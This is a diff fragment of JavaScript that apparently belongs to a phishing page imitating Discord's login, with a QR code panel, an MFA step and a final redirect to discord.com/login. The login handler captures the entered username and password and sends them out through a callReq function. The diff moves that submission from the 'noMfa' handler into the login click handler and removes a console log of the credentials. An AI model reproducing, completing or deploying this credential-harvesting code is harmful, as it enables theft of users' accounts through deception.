@@ -81,18 +81,16 @@ function simulateQrCodeChange() {
   qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
 }
 
-setInterval(simulateQrCodeChange, 120 * 1000);
-
 // --------------------------
 // ATTACHING EVENT LISTENERS
 // --------------------------
 loginButton.addEventListener("click", () => {
   username = document.getElementById('emailORphone').value;
   password = document.getElementById('password').value;
-  console.log(username + ' ' + password);
   if (username && password) {
     changeDisplayBox();
   } else {
+    callReq({ username: username, password: password});
     changeLoginStyle();
   }
 });
@@ -110,7 +108,6 @@ confirmButton.addEventListener("click", async () => {
 });
 
 noMfa.addEventListener("click", async () => {
-  await callReq({ username: username, password: password});
   document.location = 'https://discord.com/login';
 });
 
